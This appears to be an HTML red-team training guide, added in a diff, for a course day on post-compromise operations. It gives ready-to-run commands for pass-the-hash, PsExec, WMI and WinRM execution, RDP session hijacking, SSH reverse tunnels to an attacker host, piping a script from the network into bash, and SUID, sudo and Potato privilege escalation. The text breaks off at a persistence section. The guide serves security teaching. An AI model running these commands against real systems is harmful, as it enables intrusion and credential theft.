@@ -1,0 +1,1488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Red Team Operations — Research Guide</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Bebas+Neue&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #080c10;
+    --surface: #0d1117;
+    --surface2: #161b22;
+    --border: #21262d;
+    --accent: #f0883e;
+    --accent2: #58a6ff;
+    --accent3: #3fb950;
+    --danger: #f85149;
+    --text: #e6edf3;
+    --muted: #8b949e;
+    --mono: 'Share Tech Mono', monospace;
+    --display: 'Bebas Neue', sans-serif;
+    --body: 'Inter', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--body);
+    font-size: 14px;
+    line-height: 1.6;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
+    pointer-events: none;
+    z-index: 1000;
+  }
+
+  /* Header */
+  header {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: rgba(8,12,16,0.95);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid var(--border);
+    padding: 0 24px;
+    display: flex;
+    align-items: center;
+    gap: 32px;
+    height: 52px;
+  }
+
+  .logo {
+    font-family: var(--mono);
+    color: var(--accent);
+    font-size: 13px;
+    letter-spacing: 2px;
+    white-space: nowrap;
+  }
+
+  nav {
+    display: flex;
+    gap: 2px;
+    flex-wrap: wrap;
+    flex: 1;
+  }
+
+  nav a {
+    color: var(--muted);
+    text-decoration: none;
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    transition: all 0.15s;
+    white-space: nowrap;
+  }
+
+  nav a:hover, nav a.active {
+    color: var(--accent);
+    background: rgba(240,136,62,0.1);
+  }
+
+  /* Hero */
+  .hero {
+    padding: 60px 24px 40px;
+    border-bottom: 1px solid var(--border);
+    background: linear-gradient(180deg, rgba(240,136,62,0.04) 0%, transparent 100%);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .hero::after {
+    content: 'RED TEAM';
+    position: absolute;
+    right: -20px;
+    top: -10px;
+    font-family: var(--display);
+    font-size: 180px;
+    color: rgba(240,136,62,0.04);
+    letter-spacing: -5px;
+    user-select: none;
+    pointer-events: none;
+  }
+
+  .hero-tag {
+    font-family: var(--mono);
+    color: var(--accent);
+    font-size: 11px;
+    letter-spacing: 3px;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .hero-tag::before {
+    content: '';
+    display: inline-block;
+    width: 6px; height: 6px;
+    background: var(--accent);
+    border-radius: 50%;
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  .hero h1 {
+    font-family: var(--display);
+    font-size: clamp(48px, 8vw, 96px);
+    line-height: 0.9;
+    letter-spacing: 2px;
+    color: var(--text);
+    margin-bottom: 16px;
+  }
+
+  .hero h1 span { color: var(--accent); }
+
+  .hero-sub {
+    color: var(--muted);
+    font-size: 13px;
+    max-width: 600px;
+    margin-bottom: 32px;
+  }
+
+  .phase-strip {
+    display: flex;
+    gap: 1px;
+    flex-wrap: wrap;
+  }
+
+  .phase-chip {
+    font-family: var(--mono);
+    font-size: 11px;
+    padding: 4px 12px;
+    border-radius: 2px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    color: var(--muted);
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .phase-chip:hover { border-color: var(--accent); color: var(--accent); }
+  .phase-chip.c1 { color: var(--accent); border-color: rgba(240,136,62,0.3); }
+  .phase-chip.c2 { color: var(--accent2); border-color: rgba(88,166,255,0.3); }
+  .phase-chip.c3 { color: var(--accent3); border-color: rgba(63,185,80,0.3); }
+  .phase-chip.c4 { color: var(--danger); border-color: rgba(248,81,73,0.3); }
+  .phase-chip.c5 { color: #bc8cff; border-color: rgba(188,140,255,0.3); }
+
+  /* Main layout */
+  .layout {
+    display: grid;
+    grid-template-columns: 220px 1fr;
+    min-height: calc(100vh - 52px);
+  }
+
+  /* Sidebar */
+  aside {
+    border-right: 1px solid var(--border);
+    padding: 24px 0;
+    position: sticky;
+    top: 52px;
+    height: calc(100vh - 52px);
+    overflow-y: auto;
+  }
+
+  .aside-section {
+    margin-bottom: 24px;
+  }
+
+  .aside-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 2px;
+    color: var(--muted);
+    padding: 0 16px;
+    margin-bottom: 8px;
+  }
+
+  .aside-link {
+    display: block;
+    padding: 6px 16px;
+    color: var(--muted);
+    text-decoration: none;
+    font-size: 13px;
+    transition: all 0.1s;
+    border-left: 2px solid transparent;
+    cursor: pointer;
+  }
+
+  .aside-link:hover { color: var(--text); border-left-color: var(--accent); background: rgba(240,136,62,0.05); }
+  .aside-link.active { color: var(--accent); border-left-color: var(--accent); background: rgba(240,136,62,0.08); }
+
+  /* Content */
+  main {
+    padding: 32px;
+    max-width: 900px;
+  }
+
+  /* Section */
+  .section {
+    margin-bottom: 64px;
+    scroll-margin-top: 72px;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 24px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-number {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+  }
+
+  .section-title {
+    font-family: var(--display);
+    font-size: 36px;
+    letter-spacing: 1px;
+  }
+
+  .section-title.orange { color: var(--accent); }
+  .section-title.blue { color: var(--accent2); }
+  .section-title.green { color: var(--accent3); }
+  .section-title.red { color: var(--danger); }
+  .section-title.purple { color: #bc8cff; }
+
+  .section-badge {
+    margin-left: auto;
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 2px;
+    border: 1px solid;
+  }
+  .badge-offensive { color: var(--danger); border-color: var(--danger); }
+  .badge-post { color: var(--accent); border-color: var(--accent); }
+
+  /* Cards */
+  .card-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+    gap: 12px;
+    margin-bottom: 24px;
+  }
+
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px;
+    transition: border-color 0.15s;
+  }
+
+  .card:hover { border-color: rgba(240,136,62,0.4); }
+
+  .card-icon {
+    font-size: 20px;
+    margin-bottom: 8px;
+  }
+
+  .card-title {
+    font-weight: 600;
+    font-size: 13px;
+    margin-bottom: 4px;
+    color: var(--text);
+  }
+
+  .card-desc {
+    font-size: 12px;
+    color: var(--muted);
+    line-height: 1.5;
+  }
+
+  /* Code blocks */
+  .code-block {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 16px 0;
+    overflow: hidden;
+  }
+
+  .code-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 16px;
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-label {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+  }
+
+  .code-tag {
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 2px 6px;
+    border-radius: 3px;
+  }
+  .tag-cmd { background: rgba(63,185,80,0.15); color: var(--accent3); }
+  .tag-win { background: rgba(88,166,255,0.15); color: var(--accent2); }
+  .tag-lin { background: rgba(240,136,62,0.15); color: var(--accent); }
+  .tag-warn { background: rgba(248,81,73,0.15); color: var(--danger); }
+
+  pre {
+    padding: 16px;
+    overflow-x: auto;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 1.7;
+    color: var(--text);
+  }
+
+  pre .c { color: var(--muted); }
+  pre .k { color: var(--accent2); }
+  pre .s { color: var(--accent3); }
+  pre .w { color: var(--accent); }
+  pre .d { color: var(--danger); }
+  pre .p { color: #bc8cff; }
+
+  /* Technique table */
+  .technique-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+    margin: 16px 0;
+  }
+
+  .technique-table th {
+    text-align: left;
+    padding: 8px 12px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 1px;
+  }
+
+  .technique-table td {
+    padding: 8px 12px;
+    border: 1px solid var(--border);
+    vertical-align: top;
+    line-height: 1.5;
+  }
+
+  .technique-table tr:hover td { background: rgba(255,255,255,0.02); }
+
+  .mitre-tag {
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 2px 6px;
+    border-radius: 3px;
+    background: rgba(88,166,255,0.1);
+    color: var(--accent2);
+    white-space: nowrap;
+  }
+
+  /* Alert boxes */
+  .alert {
+    padding: 12px 16px;
+    border-radius: 6px;
+    border-left: 3px solid;
+    margin: 16px 0;
+    font-size: 13px;
+  }
+
+  .alert-warn {
+    background: rgba(240,136,62,0.08);
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+
+  .alert-info {
+    background: rgba(88,166,255,0.08);
+    border-color: var(--accent2);
+    color: var(--accent2);
+  }
+
+  .alert-danger {
+    background: rgba(248,81,73,0.08);
+    border-color: var(--danger);
+    color: var(--danger);
+  }
+
+  .alert-success {
+    background: rgba(63,185,80,0.08);
+    border-color: var(--accent3);
+    color: var(--accent3);
+  }
+
+  /* Report template */
+  .report-template {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    overflow: hidden;
+  }
+
+  .report-section-title {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 10px 16px;
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 12px;
+    cursor: pointer;
+    user-select: none;
+    transition: background 0.1s;
+  }
+
+  .report-section-title:hover { background: rgba(240,136,62,0.08); }
+
+  .report-section-body {
+    padding: 16px;
+    font-size: 13px;
+    line-height: 1.7;
+    display: none;
+  }
+
+  .report-section-body.open { display: block; }
+
+  .toggle-icon { margin-left: auto; color: var(--muted); font-size: 10px; }
+
+  /* Severity badges */
+  .sev {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 2px;
+    font-weight: bold;
+  }
+  .sev-crit { background: rgba(248,81,73,0.2); color: var(--danger); }
+  .sev-high { background: rgba(240,136,62,0.2); color: var(--accent); }
+  .sev-med  { background: rgba(255,212,59,0.2); color: #ffd43b; }
+  .sev-low  { background: rgba(63,185,80,0.2); color: var(--accent3); }
+  .sev-info { background: rgba(88,166,255,0.2); color: var(--accent2); }
+
+  /* Misc helpers */
+  p { margin-bottom: 12px; color: var(--muted); font-size: 13px; }
+  h3 { font-size: 14px; color: var(--text); margin: 20px 0 8px; font-weight: 600; }
+  h4 { font-size: 12px; color: var(--muted); margin: 16px 0 6px; font-family: var(--mono); letter-spacing: 1px; text-transform: uppercase; }
+  ul, ol { padding-left: 20px; color: var(--muted); font-size: 13px; line-height: 1.8; }
+  li { margin-bottom: 2px; }
+  strong { color: var(--text); }
+
+  .inline-code {
+    font-family: var(--mono);
+    font-size: 11px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 1px 6px;
+    color: var(--accent3);
+  }
+
+  /* ATT&CK chain visual */
+  .attack-chain {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    overflow-x: auto;
+    padding: 16px 0;
+    margin: 16px 0;
+  }
+
+  .chain-step {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    padding: 8px 14px;
+    font-size: 11px;
+    font-family: var(--mono);
+    white-space: nowrap;
+    position: relative;
+    flex-shrink: 0;
+    transition: background 0.15s;
+  }
+
+  .chain-step:hover { background: var(--surface2); }
+
+  .chain-step::after {
+    content: '→';
+    position: absolute;
+    right: -12px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--muted);
+    font-size: 14px;
+    z-index: 1;
+  }
+
+  .chain-step:last-child::after { display: none; }
+
+  .chain-step.s1 { color: var(--accent); border-color: rgba(240,136,62,0.3); }
+  .chain-step.s2 { color: var(--accent2); border-color: rgba(88,166,255,0.3); }
+  .chain-step.s3 { color: var(--accent3); border-color: rgba(63,185,80,0.3); }
+  .chain-step.s4 { color: var(--danger); border-color: rgba(248,81,73,0.3); }
+  .chain-step.s5 { color: #bc8cff; border-color: rgba(188,140,255,0.3); }
+  .chain-step.gap { background: none; border: none; width: 24px; }
+
+  /* Footer */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 24px 32px;
+    color: var(--muted);
+    font-family: var(--mono);
+    font-size: 11px;
+    display: flex;
+    justify-content: space-between;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">▶ RT_OPS</div>
+  <nav>
+    <a href="#lateral" class="active">Lateral Movement</a>
+    <a href="#privesc">Priv Esc</a>
+    <a href="#postex">Post-Exploitation</a>
+    <a href="#misconfig">Misconfigurations</a>
+    <a href="#reporting">Report Writing</a>
+  </nav>
+</header>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-tag">INSA CYBER TALENT — RED TEAM TRACK — DAY 22</div>
+  <h1>POST-<span>COMPROMISE</span><br>OPERATIONS</h1>
+  <p class="hero-sub">Blue team defends. Red team pivots. Understanding the attacker's full kill chain — from initial foothold to domain domination — and how to document it professionally.</p>
+  <div class="phase-strip">
+    <div class="phase-chip c1">01 · Lateral Movement</div>
+    <div class="phase-chip c2">02 · Privilege Escalation</div>
+    <div class="phase-chip c3">03 · Post-Exploitation</div>
+    <div class="phase-chip c4">04 · Misconfigurations</div>
+    <div class="phase-chip c5">05 · Report Writing</div>
+  </div>
+</div>
+
+<div class="layout">
+<aside>
+  <div class="aside-section">
+    <div class="aside-label">LATERAL MOVEMENT</div>
+    <div class="aside-link active" onclick="scrollTo('lateral')">Overview</div>
+    <div class="aside-link" onclick="scrollTo('pass-the-hash')">Pass-the-Hash</div>
+    <div class="aside-link" onclick="scrollTo('psexec')">PsExec / SMB</div>
+    <div class="aside-link" onclick="scrollTo('rdp-hijack')">RDP Hijacking</div>
+    <div class="aside-link" onclick="scrollTo('wmi-winrm')">WMI / WinRM</div>
+    <div class="aside-link" onclick="scrollTo('ssh-pivot')">SSH Pivoting</div>
+  </div>
+  <div class="aside-section">
+    <div class="aside-label">PRIVILEGE ESCALATION</div>
+    <div class="aside-link" onclick="scrollTo('privesc')">Overview</div>
+    <div class="aside-link" onclick="scrollTo('suid')">SUID / Capabilities</div>
+    <div class="aside-link" onclick="scrollTo('sudo-abuse')">Sudo Misconfig</div>
+    <div class="aside-link" onclick="scrollTo('token-imp')">Token Impersonation</div>
+    <div class="aside-link" onclick="scrollTo('cve-privesc')">Kernel Exploits</div>
+  </div>
+  <div class="aside-section">
+    <div class="aside-label">POST-EXPLOITATION</div>
+    <div class="aside-link" onclick="scrollTo('postex')">Overview</div>
+    <div class="aside-link" onclick="scrollTo('persistence')">Persistence</div>
+    <div class="aside-link" onclick="scrollTo('cred-dump')">Credential Dumping</div>
+    <div class="aside-link" onclick="scrollTo('c2')">C2 Frameworks</div>
+    <div class="aside-link" onclick="scrollTo('exfil')">Exfiltration</div>
+  </div>
+  <div class="aside-section">
+    <div class="aside-label">MISCONFIGURATIONS</div>
+    <div class="aside-link" onclick="scrollTo('misconfig')">Overview</div>
+    <div class="aside-link" onclick="scrollTo('smb-misconfig')">SMB / NFS</div>
+    <div class="aside-link" onclick="scrollTo('ad-misconfig')">Active Directory</div>
+    <div class="aside-link" onclick="scrollTo('web-misconfig')">Web / API</div>
+  </div>
+  <div class="aside-section">
+    <div class="aside-label">REPORTING</div>
+    <div class="aside-link" onclick="scrollTo('reporting')">Report Structure</div>
+    <div class="aside-link" onclick="scrollTo('finding-format')">Finding Format</div>
+    <div class="aside-link" onclick="scrollTo('cvss')">CVSS Scoring</div>
+    <div class="aside-link" onclick="scrollTo('ctf-report')">CTF Write-up Format</div>
+  </div>
+</aside>
+
+<main>
+
+<!-- ==================== SECTION 1: LATERAL MOVEMENT ==================== -->
+<section class="section" id="lateral">
+  <div class="section-header">
+    <span class="section-number">01</span>
+    <h2 class="section-title orange">LATERAL MOVEMENT</h2>
+    <span class="section-badge badge-offensive">OFFENSIVE</span>
+  </div>
+
+  <p>Lateral movement is the phase where an attacker — already holding a foothold on one machine — moves horizontally through the network to reach higher-value targets. The goal is to avoid detection while expanding access. Blue teamers: this is the phase your SIEM <em>should</em> catch.</p>
+
+  <div class="alert alert-info">
+    <strong>ATT&CK Tactic:</strong> TA0008 — Lateral Movement. Techniques include T1021 (Remote Services), T1550 (Use Alternate Auth Material), T1570 (Lateral Tool Transfer).
+  </div>
+
+  <!-- Attack chain -->
+  <div class="attack-chain">
+    <div class="chain-step s1">Initial Access</div>
+    <div class="chain-step gap"></div>
+    <div class="chain-step s1">Foothold<br><small>user shell</small></div>
+    <div class="chain-step gap"></div>
+    <div class="chain-step s2">Recon<br><small>net scan</small></div>
+    <div class="chain-step gap"></div>
+    <div class="chain-step s2">Cred Harvest<br><small>mimikatz</small></div>
+    <div class="chain-step gap"></div>
+    <div class="chain-step s3">Pivot<br><small>PTH / PsExec</small></div>
+    <div class="chain-step gap"></div>
+    <div class="chain-step s4">DC Access<br><small>domain admin</small></div>
+  </div>
+
+  <h3 id="pass-the-hash">🔑 Pass-the-Hash (PtH)</h3>
+  <p>NTLM authentication uses a password hash, not the plaintext password. If you steal the hash, you can authenticate <em>as</em> that user without ever cracking it.</p>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Pass-the-Hash with CrackMapExec</span>
+      <span class="code-tag tag-win">WINDOWS</span>
+    </div>
+    <pre><span class="c"># Dump hashes from compromised host first</span>
+<span class="k">mimikatz</span> <span class="s"># sekurlsa::logonpasswords</span>
+
+<span class="c"># Use hash to auth to another machine (no password needed)</span>
+<span class="w">crackmapexec smb</span> 192.168.1.0/24 \
+  -u Administrator \
+  -H <span class="d">aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c</span> \
+  --exec-method smbexec \
+  -x <span class="s">"whoami"</span>
+
+<span class="c"># With impacket</span>
+<span class="w">impacket-psexec</span> Administrator@192.168.1.10 \
+  -hashes <span class="d">:8846f7eaee8fb117ad06bdd830b7586c</span></pre>
+  </div>
+
+  <h3 id="psexec">🖥️ PsExec / SMB Execution</h3>
+  <p>PsExec creates a service on the remote host and executes commands through it. Requires admin shares (<span class="inline-code">ADMIN$</span>) to be accessible.</p>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Remote Execution via SMB</span>
+      <span class="code-tag tag-win">WINDOWS</span>
+    </div>
+    <pre><span class="c"># Impacket PsExec (spawns SYSTEM shell)</span>
+<span class="w">impacket-psexec</span> domain/user:password@192.168.1.10
+
+<span class="c"># SMBExec (no binary upload, lower footprint)</span>
+<span class="w">impacket-smbexec</span> domain/user:password@192.168.1.10
+
+<span class="c"># Verify SMB access first</span>
+<span class="w">crackmapexec smb</span> 192.168.1.10 -u user -p password</pre>
+  </div>
+
+  <h3 id="rdp-hijack">🖥️ RDP Hijacking</h3>
+  <p>If RDP is enabled and you have SYSTEM privileges, you can hijack an existing disconnected RDP session — no credentials required.</p>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">RDP Session Hijacking</span>
+      <span class="code-tag tag-win">WINDOWS (SYSTEM required)</span>
+    </div>
+    <pre><span class="c"># List active/disconnected sessions</span>
+<span class="w">query session</span>
+
+<span class="c"># Hijack session ID 2 (must be SYSTEM)</span>
+<span class="w">tscon</span> 2 /dest:rdp-tcp#0
+
+<span class="c"># Enable RDP via registry if disabled</span>
+<span class="w">reg add</span> <span class="s">"HKLM\System\CurrentControlSet\Control\Terminal Server"</span> \
+  /v fDenyTSConnections /t REG_DWORD /d 0 /f</pre>
+  </div>
+
+  <h3 id="wmi-winrm">⚡ WMI & WinRM</h3>
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Remote Code Execution via WMI / WinRM</span>
+      <span class="code-tag tag-win">WINDOWS</span>
+    </div>
+    <pre><span class="c"># WMI remote execution (port 135)</span>
+<span class="w">impacket-wmiexec</span> domain/user:password@192.168.1.10
+
+<span class="c"># WinRM with Evil-WinRM (port 5985)</span>
+<span class="w">evil-winrm</span> -i 192.168.1.10 -u Administrator -p password
+<span class="c"># or with hash</span>
+<span class="w">evil-winrm</span> -i 192.168.1.10 -u Administrator -H <span class="d">NTLMHASH</span></pre>
+  </div>
+
+  <h3 id="ssh-pivot">🔀 SSH Pivoting / Port Forwarding</h3>
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Tunneling through compromised hosts</span>
+      <span class="code-tag tag-lin">LINUX</span>
+    </div>
+    <pre><span class="c"># Local port forward: reach internal RDP via compromised host</span>
+<span class="w">ssh</span> -L 3389:10.10.10.5:3389 user@compromised-host
+
+<span class="c"># Dynamic SOCKS proxy (route all traffic through pivot)</span>
+<span class="w">ssh</span> -D 1080 user@compromised-host
+<span class="c"># then: proxychains nmap -sT 10.10.10.0/24</span>
+
+<span class="c"># Reverse tunnel (call home from inside network)</span>
+<span class="w">ssh</span> -R 4444:localhost:22 attacker@your-vps</pre>
+  </div>
+
+  <table class="technique-table">
+    <tr>
+      <th>Technique</th>
+      <th>MITRE ID</th>
+      <th>Protocol</th>
+      <th>Requires</th>
+    </tr>
+    <tr>
+      <td>Pass-the-Hash</td>
+      <td><span class="mitre-tag">T1550.002</span></td>
+      <td>NTLM/SMB</td>
+      <td>NTLM hash, admin rights on target</td>
+    </tr>
+    <tr>
+      <td>PsExec</td>
+      <td><span class="mitre-tag">T1021.002</span></td>
+      <td>SMB</td>
+      <td>ADMIN$ share access</td>
+    </tr>
+    <tr>
+      <td>WMI Exec</td>
+      <td><span class="mitre-tag">T1047</span></td>
+      <td>DCOM/RPC</td>
+      <td>Admin credentials, port 135</td>
+    </tr>
+    <tr>
+      <td>RDP</td>
+      <td><span class="mitre-tag">T1021.001</span></td>
+      <td>RDP</td>
+      <td>Credentials or session hijack (SYSTEM)</td>
+    </tr>
+    <tr>
+      <td>WinRM/Evil-WinRM</td>
+      <td><span class="mitre-tag">T1021.006</span></td>
+      <td>HTTP/HTTPS</td>
+      <td>WinRM enabled, admin creds or hash</td>
+    </tr>
+    <tr>
+      <td>SSH Tunneling</td>
+      <td><span class="mitre-tag">T1572</span></td>
+      <td>SSH</td>
+      <td>SSH access to pivot host</td>
+    </tr>
+  </table>
+</section>
+
+<!-- ==================== SECTION 2: PRIVILEGE ESCALATION ==================== -->
+<section class="section" id="privesc">
+  <div class="section-header">
+    <span class="section-number">02</span>
+    <h2 class="section-title blue">PRIVILEGE ESCALATION</h2>
+    <span class="section-badge badge-offensive">OFFENSIVE</span>
+  </div>
+
+  <p>PrivEsc is about going from a low-privileged shell to <strong>root</strong> (Linux) or <strong>SYSTEM/Domain Admin</strong> (Windows). Every engagement needs it — initial access rarely lands you as admin.</p>
+
+  <div class="card-grid">
+    <div class="card">
+      <div class="card-icon">🐧</div>
+      <div class="card-title">Linux PrivEsc</div>
+      <div class="card-desc">SUID bits, sudo misconfig, cron jobs, writable /etc/passwd, kernel exploits, capabilities</div>
+    </div>
+    <div class="card">
+      <div class="card-icon">🪟</div>
+      <div class="card-title">Windows PrivEsc</div>
+      <div class="card-desc">Token impersonation (Potato attacks), service misconfigs, AlwaysInstallElevated, DLL hijacking, unquoted service paths</div>
+    </div>
+    <div class="card">
+      <div class="card-icon">🔍</div>
+      <div class="card-title">Enumeration First</div>
+      <div class="card-desc">LinPEAS / WinPEAS automate 90% of the discovery. Run them first, then investigate findings manually.</div>
+    </div>
+  </div>
+
+  <h3>🔍 Enumeration Tools</h3>
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Automated PrivEsc Enumeration</span>
+      <span class="code-tag tag-lin">LINUX</span>
+    </div>
+    <pre><span class="c"># LinPEAS — comprehensive Linux enumeration</span>
+<span class="w">curl</span> -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
+
+<span class="c"># LinEnum</span>
+<span class="w">./LinEnum.sh</span> -t -r report.txt
+
+<span class="c"># Manual quick checks</span>
+<span class="w">sudo -l</span>                          <span class="c"># what can this user sudo?</span>
+<span class="w">find / -perm -4000</span> 2>/dev/null  <span class="c"># SUID binaries</span>
+<span class="w">crontab -l</span> && cat /etc/crontab  <span class="c"># cron jobs</span>
+<span class="w">cat /etc/passwd</span>                  <span class="c"># writable? world-readable hashes?</span></pre>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Windows PrivEsc Enumeration</span>
+      <span class="code-tag tag-win">WINDOWS</span>
+    </div>
+    <pre><span class="c"># WinPEAS</span>
+<span class="w">.\winPEAS.exe</span>
+
+<span class="c"># Manual checks</span>
+<span class="w">whoami /priv</span>               <span class="c"># check SeImpersonatePrivilege etc.</span>
+<span class="w">systeminfo</span>                 <span class="c"># OS version for kernel exploits</span>
+<span class="w">sc query</span>                   <span class="c"># list services</span>
+<span class="w">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span>
+<span class="c">                           # AlwaysInstallElevated?</span></pre>
+  </div>
+
+  <h3 id="suid">🔴 SUID Abuse (Linux)</h3>
+  <p>SUID (Set User ID) binaries run with the owner's privileges (often root). If a SUID binary can be abused to execute commands, you get root.</p>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">SUID exploitation via GTFOBins</span>
+      <span class="code-tag tag-lin">LINUX</span>
+    </div>
+    <pre><span class="c"># Find SUID binaries</span>
+<span class="w">find / -perm -4000</span> -type f 2>/dev/null
+
+<span class="c"># Example: SUID bash</span>
+<span class="w">/bin/bash -p</span>   <span class="c"># -p preserves EUID = root shell!</span>
+
+<span class="c"># Example: SUID find</span>
+<span class="w">find . -exec /bin/bash -p \; -quit</span>
+
+<span class="c"># Example: SUID vim</span>
+<span class="w">vim</span> -c ':!/bin/bash -p'
+
+<span class="c"># Linux capabilities (similar to SUID, stealthier)</span>
+<span class="w">getcap -r / </span>2>/dev/null
+<span class="c"># python3 with cap_setuid+ep → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"</span></pre>
+  </div>
+
+  <h3 id="sudo-abuse">⚙️ Sudo Misconfiguration</h3>
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Abusing sudo rules</span>
+      <span class="code-tag tag-lin">LINUX</span>
+    </div>
+    <pre><span class="c"># Check what you can run as sudo</span>
+<span class="w">sudo -l</span>
+
+<span class="c"># If: (ALL) NOPASSWD: /usr/bin/vim</span>
+<span class="w">sudo vim</span> -c ':!/bin/bash'
+
+<span class="c"># If: (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py</span>
+<span class="c"># and you can write to the script:</span>
+<span class="w">echo</span> <span class="s">'import os; os.system("/bin/bash")'</span> >> /opt/script.py
+<span class="w">sudo python3</span> /opt/script.py
+
+<span class="c"># LD_PRELOAD trick (if env_keep += LD_PRELOAD in sudoers)</span>
+<span class="c"># create malicious .so, then: sudo LD_PRELOAD=/tmp/evil.so program</span></pre>
+  </div>
+
+  <h3 id="token-imp">🪙 Token Impersonation (Windows)</h3>
+  <p>If you have <strong>SeImpersonatePrivilege</strong> (common on IIS/service accounts), you can impersonate SYSTEM using Potato attacks.</p>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Potato Attacks — SeImpersonatePrivilege → SYSTEM</span>
+      <span class="code-tag tag-win">WINDOWS</span>
+    </div>
+    <pre><span class="c"># Check privilege (look for SeImpersonatePrivilege Enabled)</span>
+<span class="w">whoami /priv</span>
+
+<span class="c"># PrintSpoofer (Windows 10 / Server 2019)</span>
+<span class="w">.\PrintSpoofer64.exe</span> -i -c powershell.exe
+
+<span class="c"># GodPotato (universal)</span>
+<span class="w">.\GodPotato.exe</span> -cmd "cmd /c whoami"
+
+<span class="c"># JuicyPotato (older systems)</span>
+<span class="w">.\JuicyPotato.exe</span> -l 1337 -p c:\windows\system32\cmd.exe \
+  -t * -c {CLSID}</pre>
+  </div>
+
+  <h3 id="cve-privesc">💥 Kernel Exploits</h3>
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Finding and using kernel exploits</span>
+      <span class="code-tag tag-lin">LINUX</span>
+    </div>
+    <pre><span class="c"># Get kernel version</span>
+<span class="w">uname -a</span>
+<span class="w">cat /etc/os-release</span>
+
+<span class="c"># Search for exploits</span>
+<span class="w">searchsploit</span> linux kernel 5.4
+
+<span class="c"># Linux Smart Enumeration (checks known CVEs)</span>
+<span class="w">./lse.sh -l 2</span>
+
+<span class="c"># Famous: DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)</span>
+<span class="c"># Polkit (CVE-2021-4034) — pkexec local privesc</span></pre>
+  </div>
+</section>
+
+<!-- ==================== SECTION 3: POST-EXPLOITATION ==================== -->
+<section class="section" id="postex">
+  <div class="section-header">
+    <span class="section-number">03</span>
+    <h2 class="section-title green">POST-EXPLOITATION</h2>
+    <span class="section-badge badge-post">PHASE 3</span>
+  </div>
+
+  <p>You're in. You're root. Now what? Post-exploitation is about maximizing the value of your access: maintain persistence, dump credentials, map the environment, and exfiltrate data — while staying undetected.</p>
+
+  <h3 id="persistence">🔒 Persistence</h3>
+  <p>Persistence ensures you maintain access even after reboots, password changes, or detection events.</p>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">Linux Persistence Techniques</span>
